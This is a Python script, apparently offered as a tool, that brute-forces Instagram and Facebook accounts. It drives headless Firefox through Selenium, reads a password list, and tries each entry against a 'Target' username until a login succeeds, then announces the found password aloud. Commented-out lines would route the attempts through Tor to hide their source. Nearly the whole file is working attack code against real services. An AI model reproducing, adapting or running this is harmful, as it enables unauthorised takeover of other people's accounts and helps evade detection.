import os
import pyttsx3
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import subprocess
import selenium.webdriver.common.keys
from selenium.common.exceptions import NoSuchElementException,StaleElementReferenceException
def Read(Path):
    with open(Path,'r') as F:
        for i in F:
            yield i
class Instagram_Brute:
    def __init__(self,username,password):
        os.environ['MOZ_HEADLESS'] = '1'
        self.username=username
        self.password=password
        self.driver=webdriver.Firefox()
    def closeBrowser(self):
        self.driver.close()
    def Login(self):
        driver=self.driver
        driver.get('https://www.instagram.com/accounts/login/?source=auth_switcher')
        time.sleep(5)
        user_name = driver.find_element_by_xpath("//input[@name='username']")
        user_name.clear()
        password_elem = driver.find_element_by_xpath("//input[@name='password']")
        password_elem.clear()
        user_name.send_keys(self.username)
        password_elem.send_keys(self.password)
        password_elem.send_keys(Keys.RETURN)
        time.sleep(5)
        current_url=driver.current_url
        time.sleep(5)
        if(current_url!='https://www.instagram.com/accounts/login/?source=auth_switcher'):
            return True
        return False
class FaceBook_Brute:
    def __init__(self, username, password):
        os.environ['MOZ_HEADLESS'] = '1'
        self.username = username
        self.password = password
        self.driver = webdriver.Firefox()

    def closeBrowser(self):
        self.driver.close()

    def Login(self):
        driver = self.driver
        driver.get('https://www.facebook.com/')
        time.sleep(5)
        user_name = driver.find_element_by_xpath("//input[@name='email']")
        user_name.clear()
        password_elem = driver.find_element_by_xpath("//input[@name='pass']")
        password_elem.clear()
        user_name.send_keys(self.username)
        password_elem.send_keys(self.password)
        password_elem.send_keys(Keys.RETURN)
        time.sleep(5)
        current_url = driver.current_url
        time.sleep(5)
        if (current_url == 'https://www.facebook.com'):
            return True
        return False

if __name__ == '__main__':
        #print("Connecting To Tor")
        #os.environ['MOZ_HEADLESS'] = '1'
        #brow_path=input('Enter Your Tor Browser Path:')
        #sproc = subprocess.Popen(brow_path)
        #time.sleep(10)
        #driver = webdriver.Firefox()
        #driver.get("https://httpbin.org/ip")
        #time.sleep(10)
        #print(driver.page_source)
        #time.sleep(10)
        #driver.close()
        #time.sleep(5)
        #print("Successfully Connected To Tor")
        #time.sleep(5)
        choice=input('Select Your Option \n1.Instagram \n2.Facebook\n')
        if(choice=='1'):
            username = input('Enter Username Of The Target:')
            Path = input('Specify Password File Path:')
            G = list(set(Read(Path)))
            Attempt=1
            for password in G:
                print('Attempt:', Attempt)
                print('Testing Password:',password)
                Insta_obj = Instagram_Brute(username, password)
                Verify_elem=Insta_obj.Login()
                if(Verify_elem):
                    print('Password For '+username+ 'is : '+password)
                    engine = pyttsx3.init()
                    try:
                        print("Press ctrl^c To Exit")
                        while (True):
                            engine.say("PASSWORD FOUND")
                            engine.runAndWait()
                    except KeyboardInterrupt:
                        sproc.kill()
                    break
                else:
                    Attempt+=1
                    Insta_obj.closeBrowser()
        elif(choice=='2'):
            username = input('Enter Username Of The Target:')
            Path = input('Specify Password File Path:')
            G = list(set(Read(Path)))
            Attempt=1
            for password in G:
                print('Attempt:', Attempt)
                print('Testing Password:',password)
                FaceBook_obj = FaceBook_Brute(username, password)
                Verify_elem=FaceBook_obj.Login()
                if(Verify_elem):
                    print('Password For '+username+' is : '+password)
                    engine = pyttsx3.init()
                    try:
                        print("Press ctrl^c To Exit")
                        while (True):
                            engine.say("PASSWORD FOUND")
                            engine.runAndWait()
                    except KeyboardInterrupt:
                        sproc.kill()
                    break
                else:
                    Attempt+=1
                    FaceBook_obj.closeBrowser()
        else:
            print("INVALID CHOICE")
            sproc.kill()
